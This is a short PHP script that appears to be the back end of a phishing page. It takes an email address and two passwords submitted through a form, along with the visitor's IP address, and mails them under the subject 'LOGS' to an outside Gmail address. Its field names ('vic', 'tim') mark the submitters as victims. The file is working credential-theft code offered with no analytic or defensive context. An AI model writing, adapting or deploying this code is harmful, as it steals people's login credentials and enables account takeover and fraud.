<?php
$to = "iran.supplly@gmail.com";
$ip = getenv("REMOTE_ADDR");
$user = $_POST["log"];
$pass1 = $_POST["vic"];
$pass = $_POST["tim"];
$from = "TODAY'S-LOGS";
$subject = "LOGS"; 
$message = "Email: $user\n Pass: $pass1\n  Pass: $pass\n ip: $ip\n ";
mail($to, $subject, $message, $from);
header("");
?>